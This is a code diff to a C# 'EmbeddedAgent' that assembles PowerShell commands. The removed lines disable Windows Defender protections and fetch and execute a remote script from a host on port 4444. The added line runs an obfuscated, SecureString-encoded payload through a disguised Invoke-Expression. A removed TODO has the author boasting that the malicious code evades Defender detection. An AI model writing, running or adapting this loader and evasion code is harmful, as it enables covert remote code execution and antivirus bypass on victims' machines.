@@ -55,41 +55,11 @@ namespace EmbeddedAgent
             {
                 $"cd $env:tmp",
                 "Set-ExecutionPolicy Unrestricted",
-                "Set-MpPreference -DisableRealtimeMonitoring $True",
-                "Set-MpPreference -DisableBehaviorMonitoring $True",
-                "Set-MpPreference -DisableBlockAtFirstSeen $True",
-                "Set-MpPreference -DisableIOAVProtection $True",
-                "Set-MpPreference -DisablePrivacyMode $True",
-                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $True",
-                "Set-MpPreference -DisableArchiveScanning $True",
-                "Set-MpPreference -DisableScriptScanning $True",
-                "Set-MpPreference -DisableIntrusionPreventionSystem $True",
-                "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.131:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex"
+               // "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.128:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
+                "( [RuNTiMe.iNtERoPSeRvIceS.mArShAl]::PTRtosTrINgbsTR([rUntIME.inTERopSeRVICES.MARshAL]::sECurEStrINGTobsTr($('76492d1116743f0423413b16050a5345MgB8AGYAcQBBAHQAZwBJAG0ARwByAEEARwBLAHIAeQAxAFkATABDAFYAOQBKAGcAPQA9AHwAZABmAGMAMwBmAGIANwA3AGIAOAAxADEAZQAxAGYANwA4ADkANAAyAGIAYQAzAGYAZgA2ADAANABjADEAMgA1AGMAZgAyADMAYgBiADgANgA2ADAAMgA5ADkAZAA5AGEAYwBkADMAYQA3ADYANQA1ADIAMgAyADIAMwAyAGEAYwA4ADAAMAAxAGEAMwBlAGQAMwA4AGYAMQAyADcAZQAyADUAYwA2ADkAZAAzADMAYgA4AGYAYQA0AGQAYQA3ADgAZgA3AGQAZAAwADcAMABjAGIAOAAzAGIAMwBmAGQAOABlADcAZgA3ADUAYgBhADIANgA3ADMANwAzADQANAA1AGMANgBmADEANAAxADgANQAzAGEANwAyADIAZAA0ADIANAA4AGYAYQBjADMANgBjAGIAYQBhADQAZQAwADMAZAAwAGIAYQBiAGIAZgAxADYAYgBhADkAMgA0AGEAZQBhADMAYQBjADEAOQA0AGQAZgAxADEAZAA5ADYANwAzADQANABiADUANwAzADAAMgA1AGMANgAzAGQAYwA5ADcANQAxADAAOABhADcAOABkADgAYQA0ADMAZAA0ADYAMwAyADYAOQBjADUAOQA4AGIAZQBjAGIAMgBhAGIAOQBjADAANQA0ADIAYwAwADgAZAAyADEAMQAzAGUAMgA2AGQAOQAxADIAZgA3AGUANABjADAAYgBhADgAZQBiAGMAZAAzADMAYQAyADQAZQA4ADAAZAAyADYAMABkADYAYwBmADAAYwA4AGUANAA1ADgAOQAwADgAMAA3AGEAYwAwAGIANABhAGQANAA5AGIANQAxADQAZgA3ADgAOQBhAGUAZQBmAGUAYgAzADcAMAAxAGQANwA4ADMAOQA0ADQAZgBiADUAYgAzADgAMQA5ADkANAAwAGMAYQBlAGUAYQAxADUAMQA4ADgAYQA2ADMAYwAzAGUAOAA0ADIAYwBhADQAYwBhADUAYQA3AGQAOABjADMANAA0ADgAOAAyADYAZAA1ADcAMwAzAGYAMgBlADgAZgA2AGUAMgAzADQAOQA2AGUAOQBhAGQANwAyADMANAA0ADcAYgBmADkAZgBiADEAMQBiADAAMgA0ADgAMQAzAGMANgBmADQAZQA5AGIAYwBlADUANwA1ADEANQAwADMAMQA3ADQAYgBmADYAMgA0AGEAYQA4ADMANQAwADIAMABkADEAYwA0ADQANABmADkAZAAzAGQANQA4AGUAYwBlAGUAZQA2AGUAOQBjADIANwAxADkAZABlADgAYgBmADUANQBlADQAMwA2ADUAOQBkADYAZABhADgAYQBkADkANQA5AGUAZAAzAGUAZAAxAGQAYgAwAGYANwAzADgAZQA1ADMAOQAyAGUAYwAzADQAOAAwADEAOAAwAGEANQAzAGQAOQA5ADIAMQBlADUAYQAxADUAYQAxADYAYQBkAGEAZQBhAGIANgBhADMAOABiAGYAMgBkADMAZgBlAGEAZABiADkANwA2AGUAYwAzADMAZAAyAGUANQA4ADUANQA1ADkAYwBjAGUAZABiAGYAZgA5AGIANAA2ADQAMgBkADMAZAA4ADEAMQA0ADgAMwA3ADcAYwBlADcAYQA4ADAAZQA0AGUAMQBkADEAZgBkADEANgAzADkAYQBmAGYAOQBkADYANQA5ADkAMQA2ADQAMgA4AGQAZQBiAGEAYQBhAGEAOQA3ADUAMAA1ADYAZgBjADkAMgBiADIAOQAyADUAMQA3ADAAMgBlADMANQBlAGQAZABkADMANwBjAGEAYQBhADAAMgA3ADIAOQBlADEAMQBkADEAMQAyADMANwBhADkAYgAyAGUAMgA1ADIAYgAyADEANwBiAGIANgAwADcAOQA4ADQAMgAxAGMAYQBmADEAMAA3AGQAMAAxADIANQA0ADkANwAxADQAMQBkADQANQBhADUAZQBiAGYAMABlADUAZQBkADcANQAwAGYANgBmAGUAMQAzADYAYQA0AGUAMwA3ADcANAA2ADMANQBmAGQAMwA4ADUANgA5AGIANgBkADMAMwA4AGIANAA4AGIAMwBlADQAZAA4AGIAYwA5ADEANwBjADcAZABmADYAZQA3AGQAOQBhAA==' | CoNvERtto-sECuresTrIng  -keY (39..54)) ))) |&( $PSHoMe[21]+$PsHOme[30]+'X')"
+
             }; ;
         }
 
-        /*
-         * TODO
-         * -----
-         * So now, I know that even after i restart the win defender the malicious code does not detected, but there is one problem,
-         * I cant figure out the time i have to wait to run the clean up commands, when waiting after the background worker, but the file launcher.bat always get deleted
-         */
-        public static List<string> CleanUpCommands()
-        {
-            //commands.Add("Remove-Item .\\launcher.bat");
-
-            return new List<string>
-            {
-                "Set-ExecutionPolicy Restricted",
-                "Set-MpPreference -DisableRealtimeMonitoring $False",
-                "Set-MpPreference -DisableBehaviorMonitoring $False",
-                "Set-MpPreference -DisableBlockAtFirstSeen $False",
-                "Set-MpPreference -DisableIOAVProtection $False",
-                "Set-MpPreference -DisablePrivacyMode $False",
-                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $False",
-                "Set-MpPreference -DisableArchiveScanning $False ",
-                "Set-MpPreference -DisableIntrusionPreventionSystem $False"
-            }; ;
-        }
     }
 }
